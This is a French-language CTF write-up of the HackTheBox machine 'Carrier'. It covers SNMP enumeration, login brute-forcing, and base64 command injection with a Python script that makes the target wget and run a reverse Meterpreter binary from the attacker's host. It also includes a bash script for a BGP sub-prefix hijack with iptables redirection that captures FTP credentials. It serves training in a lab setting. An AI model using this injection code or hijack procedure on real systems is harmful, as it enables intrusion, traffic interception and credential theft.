# Solution du CTF Carrier de HackTheBox

Huggy les bons tuyaux
---------------------

*Carrier* est un CTF proposé sur HackTheBox et créé par [snowscan](https://twitter.com/snowscan).  

C'est sans doute l'un des CTF les plus instructifs que j'ai croisé, toute plateforme confondue.  

En effet ce n'est pas tout les jours que l'on se retrouve à faire du BGP hijacking (BGP est le protocole d'échange de routes utilisé entre [systèmes autonomes](https://fr.wikipedia.org/wiki/Autonomous_System)).  

Ce type d'attaque est généralement plus utilisé par des régimes autoritaires et les répercussions semblent incontrôlables, comme [quand l'Iran a voulu bloquer un site porno](https://www.theverge.com/2017/1/7/14195118/iran-porn-block-censorship-overflow-bgp-hijack) mais que des internautes indiens, russes et indonésiens ont aussi subit les conséquences...  

Le *Pakistan* y est aussi allé [de son détournement du trafic de YouTube](https://web.archive.org/web/20080405030750/http://www.ripe.net/news/study-youtube-hijacking.html).  

D'autres exemples de détournement existent [comme celui bien mystérieux de l'AS12389](https://bgpmon.net/bgpstream-and-the-curious-case-of-as12389/) qui semblait viser de grandes entreprises de la finance.  

Le plus remarquable est sans doute l'attaque qui a permi à des auteurs inconnus de [détourner l'équivalent de 83000 dollars en Bitcoins](https://www.wired.com/2014/08/isp-bitcoin-theft/).  

*That ain't bad for four months work* comme auraient chanté [les Sex Pistols](https://www.youtube.com/watch?v=FfFbcbGaTMY) :)  

Can I has serial number ?
-------------------------

```plain
Nmap scan report for 10.10.10.105
Host is up (0.031s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

On a ici deux services accessibles, donc le choix est limité :p   

La page d'index affiche un formulaire ainsi que deux codes énigmatiques (45007, 45009).  

![HackTheBox Carrier CTF index page](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_index.png)

En fouillant sur le serveur web avec un dir-buster quelconque on trouve la page *http://10.10.10.105/debug/index.php* avec des infos toujours bonnes à noter (versions de PHP, du kernel, de la distribution, utilisateur utilisé, racine web) :   

```plain
PHP Version 7.0.30-0ubuntu0.16.04.1
Linux web 4.15.0-24-generic #26-Ubuntu SMP Wed Jun 13 08:44:47 UTC 2018 x86_64
www-data(33)/33
/var/www/html
```

On trouve aussi un dossier *doc* à la racine contenant deux fichiers énigmatiques.  

Le premier est un diagramme réseau :  

![HackTheBox Carrier CTF BGP diagram](https://github.com/devl00p/blog/raw/master/images/htb/carrier/diagram_for_tac.png)

Le second fichier est un document PDF qui énumère des codes d'erreurs. On y trouve les deux codes vu précédemment :  

![HackTheBox Carrier CTF error codes](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_error_codes.png)

Il ne nous reste plus qu'à trouver ce numéro de châssis... Est-ce que... ?  

En réalité après un scan UDP on voit un port bien connu pour son côté bavard :  

```plain
Nmap scan report for 10.10.10.105
Host is up (0.037s latency).
Not shown: 902 open|filtered ports, 97 closed ports
PORT    STATE SERVICE
161/udp open  snmp
```

Quand on le questionne on obtient exactement ce que l'on désire :  

```plain
$ snmpwalk -c public -v 1 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

Reste à voir sous quelle forme utiliser ça...  

J'ai rassemblé dans un fichier texte différentes permutation de ce code (en omettant ou pas le dièse, avec ou sans le NET\_, etc) et j'ai passé le tout à *Patator* :  

```plain
$ patator http_fuzz url="http://10.10.10.105/" method=POST body="username=FILE0&password=FILE1" 0=words.txt 1=words.txt -x ignore:clen=1538
10:10:28 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-27 10:10 CET
10:10:28 patator    INFO -
10:10:28 patator    INFO - code size:clen       time | candidate                          |   num | mesg
10:10:28 patator    INFO - -----------------------------------------------------------------------------
10:10:32 patator    INFO - 302  344:0          0.047 | admin:NET_45JDX23                  |   507 | HTTP/1.1 302 Found
10:10:33 patator    INFO - Hits/Done/Skip/Fail/Size: 1/676/0/0/676, Avg: 155 r/s, Time: 0h 0m 4s
```

La zone admin contient différentes sections dont une avec des tickets de support et une autre (diagnostics) qui semble obtenir un extrait des processus du système quand on clique sur un bouton...  

![HackTheBox Carrier CTF web admin](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_admin_zone.png)

On relève quelques tickets qui semblent intéressants :  

> Rx / LoneWolf7653. User called in to report what is according to him a "critical security issue" in our demarc equipment. Mentioned something about a CVE (??). Request contact info and sent to legal for further action.

> Rx / CastCom.  
> 
> IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end.  
> 
> Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday.  
> 
> Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating...  
> 
> Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.

> Rx / Roger (from CastCom): wants to schedule a test of their route filtering policy, asked us to inject one of their routes from our side. He's insisted we tag the route correctly so it is not readvertised to other BGP AS'es.

Ici il est clairement mention de BGP et on commence à cogiter sur comment on va s'y prendre :p   

Romeo Charlie Echo
------------------

La page de diagnostic fait un POST de données en base64 que l'on pourrait résumer comme ça :  

```plain
POST http://10.10.10.105/diag.php HTTP/1.1
check=cXVhZ2dh
```

Le décodage de cette chaîne donne *quagga*. On en déduit que le script prend la valeur dans la variable *check*, la décode en effectue un *ps aux | grep <valeur>*  

Il y a de l'injection de commande dans l'air :)  

On peut tenter d'accoler une commande *ls* et renvoyer le tout après encodage :  

![HackTheBox Carrier CTF web RCE](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_rce.png)

J'ai écrit le code suivant qui effectue un download / execute d'un reverse *Meterpreter* (j'ai essuyé quelques refus avant que ça marche d'où les nombreux entêtes) :  

```python
from base64 import b64encode

import netifaces
import requests

sess = requests.session()
sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
sess.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
sess.headers["Accept-Language"] = "en-US,en;q=0.5"
sess.headers["Pragma"] = "no-cache"
sess.headers["Upgrade-Insecure-Requests"] = "1"
sess.post(
    "http://10.10.10.105/index.php",
    data={
        "username": "admin",
        "password": "NET_45JDX23"
    }
)

CMD = (
    "quagga;"
    "wget -O /tmp/.devloop.bin http://{}:8000/reverse.bin;"
    "chmod u+x /tmp/.devloop.bin;"
    "nohup /tmp/.devloop.bin&#"
).format(netifaces.ifaddresses("tun0")[2][0]["addr"])

print(CMD)
payload = b64encode(CMD.encode()).decode()
print(payload)
response = sess.post(
    "http://10.10.10.105/diag.php",
    data={"check": payload},
    headers={"Referer": "http://10.10.10.105/diag.php"}
)
print(response.text)
```

On obtient alors un accès root sur cette machine *Ubuntu 16.04.4 LTS (Xenial)*. Cela permet d'accéder au premier flag.  

La machine dispose de trois interfaces ethernet :  

```plain
eth0      Link encap:Ethernet  HWaddr 00:16:3e:d9:04:ea
          inet addr:10.99.64.2  Bcast:10.99.64.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fed9:4ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2213 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2141 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1197755 (1.1 MB)  TX bytes:431471 (431.4 KB)

eth1      Link encap:Ethernet  HWaddr 00:16:3e:8a:f2:4f
          inet addr:10.78.10.1  Bcast:10.78.10.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe8a:f24f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:125 errors:0 dropped:0 overruns:0 frame:0
          TX packets:99 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:9150 (9.1 KB)  TX bytes:7799 (7.7 KB)

eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df
          inet addr:10.78.11.1  Bcast:10.78.11.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:121 errors:0 dropped:0 overruns:0 frame:0
          TX packets:94 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:9000 (9.0 KB)  TX bytes:6981 (6.9 KB)
```

Nmap est installé sur la machine et en scannant les réseaux sur *eth1* et *eth2* on peut voir les serveurs BGP qui correspondaient respectivement à *ZaZa* et *CastCom* :  

```plain
Nmap scan report for 10.78.10.2
Host is up (0.000033s latency).
Not shown: 65527 closed ports, 6 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

Nmap scan report for 10.78.11.2
Host is up (0.000051s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp
MAC Address: 00:16:3E:C4:FA:83 (Unknown)
```

On suppose que les versions de *Quagga* (le logiciel correspondant au service bgp) sont les mêmes pour toutes les machines du CTF :  

```plain
$ dpkg -l | grep -i quag
ii  quagga                           0.99.24.1-2ubuntu1.4                       amd64        BGP/OSPF/RIP routing daemon
```

On peut chercher les vulnérabilités liées à *Quagga* via l'utilitaire *searchsploit* sur *Kali Linux* mais les résultats ne semblent pas matcher cette version... Du coup la mention du CVE est un mystère :-/  

En route pour root
------------------

On peut trouver différents documents traitant des hijacks BGP mais l'un des plus clair et plus pratique [est celui de ColoState](https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking) (Université du Colorado) qui vaut la peine d'être lu.  

Maintenant il est temps de se retrousser les manches et de plonger dans le vif du sujet.  

On peut lire la configuration BGP dans */etc/quagga/bgpd.conf* :  

```plain
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!

```

Parmi les tickets vus précédemment il était question d'un serveur FTP sur le réseau *10.120.15.0/24*. Puisque FTP est un protocole en clair on suppose que notre mission est de détourner ce réseau via BGP pour sniffer les identifiants permettant l'accès au serveur. Seulement... un scan de ces IPs ne retourne aucun serveur FTP...  

On serait tentés d'effectuer un simple hijack de préfixe en ajoutant la ligne *network 10.120.15.0/24* puis relancer le démon *Quagga* tout en sniffant le trafic avec tcpdump...  

C'est ce que j'ai fait mais ça n'a mené à rien. Il est préférable de mettre en écoute chacune des deux interfaces (*tcdump -i ethX -vv -w captureX.cap*) pour voir ce qu'il se *trame* (blague de nerd à deux balles ;-)  

Justement on voit que *ZaZa* :  

![HackTheBox Carrier CTF ZaZa BPG announce](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_bgp_zaza.png)

ainsi que *CastCom* :  

![HackTheBox Carrier CTF CastCom BGP announce](https://github.com/devl00p/blog/raw/master/images/htb/carrier/carrier_bgp_castcom.png)

annoncent eux même la route *10.120.15.0/24* ce qui fait que notre propre annonce ne doit pas avoir d'effet sur leur trafic...  

La solution ? Passer à de l'hijack de sous-préfixe car plus la route est précise plus elle est prioritaire.  

Si on annonce un 10.120.15.0/25 on couvre les IPs allant de 10.120.15.0 à 10.120.15.127. Si on veut le reste il faut annoncer *10.120.15.128/25*.  

J'ai annoncé la première route, relancé *Quagga* et vu le plus beau SYN de ma vie à destination du port 21 de *10.120.15.10*. w00t !  

Maintenant il faut pouvoir réceptionner ce trafic FTP. La machine est configurée pour router les paquets donc si on ne fait rien la connexion n'aboutira nul part.  

J'ai vu que certains ont juste reconfiguré eth2 pour que l'adresse IP correspondent, j'ai préféré réécrire les paquets avec iptables pour que ce soit plus propre.  

J'ai écrit le script bash suivant pour automatiser l'exploitation :  

```bash
mkdir /tmp/.devloop
cd /tmp/.devloop
cp /etc/quagga/bgpd.conf.orig /tmp/.devloop/
head -11 /etc/quagga/bgpd.conf.orig > bgpd.conf
echo '! devloop edit' >> bgpd.conf
echo " network 10.120.15.0/25" >> bgpd.conf
tail -8 /etc/quagga/bgpd.conf.orig >> bgpd.conf
cp bgpd.conf /etc/quagga/bgpd.conf
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 21 -j NETMAP --to 10.78.11.1
iptables -t nat -A POSTROUTING -s 10.78.11.1 -j NETMAP --to 10.120.15.10
systemctl restart quagga
```

A côté de ça il faut mettre en place un serveur FTP qui réponde OK suffisamment de fois pour que la victime envoie son password.  

Python ne dispose pas par défaut d'un module de serveur FTP du coup je me suis retranché sur *pyftpdlib*. Je l'ai préalablement modifié car même en mode DEBUG le mot de passe est caché via des astérisques puis je l'ai transféré via Meterpreter.  

```plain
$ python3 -m pyftpdlib -p 21 -D
[I 2019-02-03 16:12:31] >>> starting FTP server on 0.0.0.0:21, pid=1271 <<<
[I 2019-02-03 16:12:31] concurrency model: async
[I 2019-02-03 16:12:31] masquerade (NAT) address: None
[I 2019-02-03 16:12:31] passive ports: None
[D 2019-02-03 16:12:31] poller: 'pyftpdlib.ioloop.Epoll'
[D 2019-02-03 16:12:31] authorizer: 'pyftpdlib.authorizers.DummyAuthorizer'
[D 2019-02-03 16:12:31] use sendfile(2): True
[D 2019-02-03 16:12:31] handler: 'pyftpdlib.handlers.type'
[D 2019-02-03 16:12:31] max connections: 512
[D 2019-02-03 16:12:31] max connections per ip: unlimited
[D 2019-02-03 16:12:31] timeout: 300
[D 2019-02-03 16:12:31] banner: 'pyftpdlib 1.5.4 ready.'
[D 2019-02-03 16:12:31] max login attempts: 3
[I 2019-02-03 16:18:11] 10.78.10.2:56670-[] FTP session opened (connect)
[D 2019-02-03 16:18:11] 10.78.10.2:56670-[] -> 220 pyftpdlib 1.5.4 ready.
[D 2019-02-03 16:18:11] 10.78.10.2:56670-[] <- USER root
[D 2019-02-03 16:18:11] 10.78.10.2:56670-[] -> 331 Username ok, send password.
[D 2019-02-03 16:18:11] 10.78.10.2:56670-[root] <- PASS BGPtelc0rout1ng
[D 2019-02-03 16:18:14] 10.78.10.2:56670-[] -> 530 Authentication failed.
[I 2019-02-03 16:18:14] 10.78.10.2:56670-[] USER 'root' failed login.
[D 2019-02-03 16:18:14] 10.78.10.2:56670-[] <- PASV
[D 2019-02-03 16:18:14] 10.78.10.2:56670-[] -> 530 Log in with USER and PASS first.
[D 2019-02-03 16:18:14] 10.78.10.2:56670-[] <- QUIT
[D 2019-02-03 16:18:14] 10.78.10.2:56670-[] -> 221 Goodbye.
[D 2019-02-03 16:18:14] [debug] call: close() (<FTPHandler(id=139833564133584, addr='10.78.10.2:56670')>)
[I 2019-02-03 16:18:14] 10.78.10.2:56670-[] FTP session closed (disconnect).
```

Ces identifiants (*root* / *BGPtelc0rout1ng*) permettent alors l'accès via SSH à 10.120.15.10 (host *carrier*) qui contient le flag root :)  

Il y avait aussi un petit troll sur la machine avec le fichier *secretdata.txt* qui contenait des caractères hexadécimaux :  

```plain
$ python3
Python 3.6.8 (default, Jan  3 2019, 03:42:36)
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from binascii import unhexlify
>>> unhexlify("56484a766247786c5a43456849513d3d")
b'VHJvbGxlZCEhIQ=='
>>> from base64 import b64decode
>>> b64decode('VHJvbGxlZCEhIQ==')
b'Trolled!!!'
```

You are being redirected
------------------------

Super CTF de *snowscan* :) Merci à lui !

*Published March 17 2019 at 14 23*